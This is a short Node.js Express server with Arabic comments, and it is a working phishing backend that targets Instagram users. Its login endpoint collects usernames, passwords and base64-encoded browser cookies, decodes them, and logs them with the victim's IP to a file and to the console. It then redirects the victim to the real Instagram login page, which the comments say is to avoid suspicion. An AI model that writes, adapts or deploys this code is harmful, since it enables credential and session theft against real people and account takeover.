const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// إعدادات لاستقبال البيانات من الفورم
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // لوضع ملف index.html في مجلد public

// نقطة الاستقبال (Endpoint)
app.post('/api/v1/auth', (req, res) => {
    const { username, password, token } = req.body;
    
    // فك تشفير الكوكيز والبيانات التقنية المرسلة من المتصفح
    let decodedData = "No Data";
    if (token) {
        try {
            decodedData = Buffer.from(token, 'base64').toString('utf-8');
        } catch (e) {
            decodedData = "Error decoding data";
        }
    }

    // تنسيق "اللوق" (Log) الذي سيظهر لك
    const logEntry = `
=========================================
[+] صيد جديد في: ${new Date().toLocaleString()}
[+] اليوزر: ${username}
[+] الباسورد: ${password}
[+] بيانات إضافية (Cookies/Browser): 
${decodedData}
[+] IP الضحية: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}
=========================================
\n`;

    // حفظ اللوق في ملف نصي
    fs.appendFile('logs.txt', logEntry, (err) => {
        if (err) console.log('Error saving log:', err);
    });

    // طباعة اللوق في الـ Console الخاص بـ Render لمتابعته فوراً
    console.log(logEntry);

    // توجيه الضحية لإنستغرام الحقيقي فوراً لإبعاد الشك
    res.redirect('https://www.instagram.com/accounts/login/');
});

app.listen(PORT, () => {
    console.log(`Don Server is flying on port ${PORT}`);
});
